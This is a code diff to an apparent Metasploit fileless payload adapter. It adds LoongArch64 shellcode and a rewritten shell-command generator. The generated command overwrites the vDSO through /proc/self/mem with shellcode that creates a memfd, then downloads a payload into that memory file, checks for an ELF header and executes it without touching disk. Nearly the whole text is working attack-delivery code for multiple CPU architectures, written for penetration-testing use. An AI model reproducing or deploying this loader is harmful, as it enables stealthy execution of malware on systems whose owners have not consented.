@@ -138,6 +138,27 @@ module Msf::Payload::Adapter::Fetch::Fileless
           0x0c010101, #0x1020:	syscall	0x40404	0x0c010101
 ]
       payload = in_memory_loader_asm.pack('N*')
+    when 'loongarch64'
+      # LoongArch uses the asm-generic Linux syscall numbers, like AArch64.
+      # Create an empty memfd and stop this process while the parent fills it.
+      # Instruction encodings: LoongArch Reference Manual, Volume 1, section 2.2.
+      # https://loongson.github.io/LoongArch-Documentation/LoongArch-Vol1-EN.html
+      in_memory_loader_asm = [
+        0x03800005, # ori a1,zero,0 (flags and ftruncate length)
+        0x02ffc063, # addi.d sp,sp,-16
+        0x29c00060, # st.d zero,sp,0 (empty memfd name)
+        0x00150064, # or a0,sp,zero
+        0x03845c0b, # ori a7,zero,279 (SYS_memfd_create)
+        0x002b0000, # syscall 0
+        0x0380b80b, # ori a7,zero,46 (SYS_ftruncate)
+        0x002b0000, # syscall 0
+        0x0382b00b, # ori a7,zero,172 (SYS_getpid)
+        0x002b0000, # syscall 0
+        0x03804c05, # ori a1,zero,19 (SIGSTOP)
+        0x0382040b, # ori a7,zero,129 (SYS_kill)
+        0x002b0000  # syscall 0
+      ]
+      payload = in_memory_loader_asm.pack('V*')
     when 'riscv64le'
       # fd = memfd_create("")
       # ftruncate(fd, 0)
@@ -187,49 +208,71 @@ module Msf::Payload::Adapter::Fetch::Fileless
     return payload
   end
 
+  # Builds a POSIX shell `$(...)` fragment that reads $vdso_addr, formats it
+  # as a hex string zero-padded to at least `width` digits, and emits it
+  # with its byte order reversed (endianness swap for the target's
+  # little-endian jmp instruction encoding).
+  #
+  # A leading zero is inserted if the formatted hex string ends up an odd
+  # number of digits -- possible whenever $vdso_addr needs more digits than
+  # `width` pads to, e.g. a 32-bit address with the 4-digit armle/mipsle
+  # width below. Without it, the trailing `${v%??}` trim never matches on
+  # the final single character and the loop never terminates.
+  #
+  # @param width [Integer] Minimum hex digits to zero-pad $vdso_addr to.
+  # @return [String] The `$(...)` shell command substitution fragment.
+  def _hex_byte_swap_shell(width)
+    %^$(v=$(printf %0#{width}x $vdso_addr); if [ $((${#v} % 2)) -ne 0 ]; then v="0$v"; fi; o=; while [ -n "$v" ]; do o=$o${v#"${v%??}"}; v=${v%??}; done; echo "$o")^
+  end
+
+  # Builds the shell fragment that encodes a jump to the discovered VDSO
+  # address for the supplied architecture.
+  #
+  # @param arch [String] The target architecture.
+  # @return [String] The shell fragment that produces the jump bytes.
   def _generate_jmp_instruction(arch)
     #
     # The sed command will basically take two characters at the time and switch their order, this is due to endianess of x86 addresses
-    
+
     case arch
     # x64 shellcode
     # mov rax, [target address]
     # jmp rax
     when 'x64'
-      %^"48b8"$(echo $(printf %016x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')"ffe0"^
-    
+      %^"48b8"#{_hex_byte_swap_shell(16)}"ffe0"^
+
     # x86 shellcode
     # mov eax, [target address]
     # jmp eax
     when 'x86'
-      %^"b8"$(echo $(printf %08x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')"ffe0"^
-    
+      %^"b8"#{_hex_byte_swap_shell(8)}"ffe0"^
+
     # ARM64 shellcode
     # ldr x0, #8
     # br x0
     when 'aarch64'
-      %^"4000005800001fd6"$(echo $(printf %016x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')^
-    
+      %^"4000005800001fd6"#{_hex_byte_swap_shell(16)}^
+
     # ARMle shelcode
     # ldr.w r2, [pc, #4]
-    # bx    r2 
+    # bx    r2
     when 'armle'
-      %^"dff804201047"$(echo $(printf %04x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')^
-    
+      %^"dff804201047"#{_hex_byte_swap_shell(4)}^
+
     # ARMbe shelcode
     # ldr.w r2, [pc, #4]
-    # bx    r2 
+    # bx    r2
     when 'armbe'
       %^"f8df20044710"$(echo $(printf %04x $vdso_addr))^
-    
+
     # MIPSEL shellcode
     # bgezal $zero, 4
     # xor $t2, $t2,$t2
     # lw	$t2, 16($ra)
     # jr $t2
     when 'mipsle'
-      %^"000011040000000026504a011000ea8f0800400100000000"$(echo $(printf %04x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')^
-    
+      %^"000011040000000026504a011000ea8f0800400100000000"#{_hex_byte_swap_shell(4)}^
+
     # MIPSBE shellcode
     # bgezal $zero, 4
     # xor $t2, $t2,$t2
@@ -237,7 +280,7 @@ module Msf::Payload::Adapter::Fetch::Fileless
     # jr $t2
     when 'mipsbe'
       %^"0411000000000000014a50268fea00100140000800000000"$(echo $(printf %04x $vdso_addr))^
-    
+
     # MIPS64 shellcode
     # bgezal $zero, 4
     # xor $t2, $t2,$t2
@@ -245,14 +288,22 @@ module Msf::Payload::Adapter::Fetch::Fileless
     # jr $t2
     when 'mips64'
       %^"041100000000000001ce7026dfee001001c0000800000000"$(echo $(printf %016x $vdso_addr))^
-    
+
+    # LoongArch64 shellcode. Prefix a nop when the injection address is 4 mod 8
+    # so the embedded address remains eight-byte aligned on every valid
+    # instruction boundary.
+    # pcaddi t0,0; ld.d t0,t0,16; jirl zero,t0,0; nop
+    # .dword [target address]
+    when 'loongarch64'
+      %($(if [ $((addr % 8)) -eq 4 ]; then printf '00004003'; fi)"0c0000188c41c0288001004c00004003"#{_hex_byte_swap_shell(16)})
+
     # RISC-V 64-bit LE shellcode
     # auipc t0, 0
     # ld    t0, 12(t0)
     # jr    t0
     # .dword [target address]
     when 'riscv64le'
-      %^"9702000083b2c20067800200"$(echo $(printf %016x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')^
+      %^"9702000083b2c20067800200"#{_hex_byte_swap_shell(16)}^
 
     # RISC-V 32-bit LE shellcode
     # auipc t0, 0
@@ -260,7 +311,7 @@ module Msf::Payload::Adapter::Fetch::Fileless
     # jr    t0
     # .word [target address]
     when 'riscv32le'
-      %^"9702000083a2c20067800200"$(echo $(printf %08x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')^
+      %^"9702000083a2c20067800200"#{_hex_byte_swap_shell(8)}^
 
     else
       fail_with(Msf::Module::Failure::BadConfig, 'Unsupported architecture')
@@ -272,10 +323,10 @@ module Msf::Payload::Adapter::Fetch::Fileless
 def _generate_fileless_shell(get_file_cmd, arch)
   stage_cmd = %<writebytes () { printf \\\\%03o "$@" ; };>
   stage_cmd << %<vdso_addr=$((0x$(grep -F "[vdso]" /proc/$$/maps | cut -d'-' -f1)));>
-  stage_cmd << %(jmp=#{_generate_jmp_instruction(arch)};)
   stage_cmd << %(sc='#{_generate_first_stage_shellcode(arch).unpack("H*")[0]}';)
   stage_cmd << 'read syscall_info < /proc/self/syscall;'
   stage_cmd << "addr=$(($(echo $syscall_info | cut -d' ' -f9)));"
+  stage_cmd << %(jmp=#{_generate_jmp_instruction(arch)};)
   stage_cmd << 'exec 3>/proc/self/mem;'
   stage_cmd << 'dd bs=1 skip=$vdso_addr <&3 >/dev/null 2>&1;'
   stage_cmd << %(printf "$(writebytes `printf $sc | sed 's/.\\{2\\}/0x& /g'`)" >&3;)
@@ -292,7 +343,11 @@ def _generate_fileless_shell(get_file_cmd, arch)
 
   cmd << 'then for f in $(find ./fd -type l -perm u=rwx 2>/dev/null);'
   cmd << 'do if [ $(ls -al $f | grep -o "memfd" >/dev/null; echo $?) -eq "0" ];'
-  cmd << "then if $(#{get_file_cmd} >/dev/null);"
+  # get_file_cmd is wrapped in a subshell so the trailing `>/dev/null` (added
+  # to swallow noise like a `tee`'s terminal echo) can't clobber a redirect
+  # get_file_cmd already embeds itself (e.g. the plain `GET`-based
+  # `... >$f`) -- the inner, more specific redirect still wins.
+  cmd << "then if (#{get_file_cmd}) >/dev/null && [ \"$(dd if=$f bs=1 count=4 2>/dev/null)\" = \"$(printf '\\177ELF')\" ];"
   cmd << 'then $f & FOUND=1;break;'
   cmd << 'fi;'
   cmd << 'fi;'
@@ -325,18 +380,26 @@ end
     # and execute it
     cmd << '; then for f in $(find /proc/$i/fd -type l -perm u=rwx 2>/dev/null)'
     cmd << '; do if [ $(ls -al $f | grep -o "memfd" >/dev/null; echo $?) -eq "0" ]'
-    cmd << "; then if $(#{get_file_cmd} >/dev/null)"
-    cmd << '; then $f'
-    cmd << '; FOUND=1'
-    cmd << '; break'
+    # get_file_cmd is wrapped in a subshell so the trailing `>/dev/null` (added
+    # to swallow noise like a `tee`'s terminal echo) can't clobber a redirect
+    # get_file_cmd already embeds itself (e.g. the plain `GET`-based
+    # `... >$f`) -- the inner, more specific redirect still wins.
+    cmd << "; then if (#{get_file_cmd}) >/dev/null && [ \"$(dd if=$f bs=1 count=4 2>/dev/null)\" = \"$(printf '\\177ELF')\" ]"
+    cmd << '; then $f '
+    cmd << '& FOUND=1'
+    # `exit`, not `break` -- a bare break would only exit this inner loop, and
+    # when this search script is concatenated with a fallback (as
+    # _execute_nix's shell-search branch does), the fallback would then run
+    # again and re-download/re-exec the payload a second time.
+    cmd << '; exit 0'
     cmd << '; fi'
     cmd << '; fi'
     cmd << '; done'
     cmd << '; fi'
     cmd << '; done'
+    cmd << ';'
 
     cmd
   end
 
 end
-
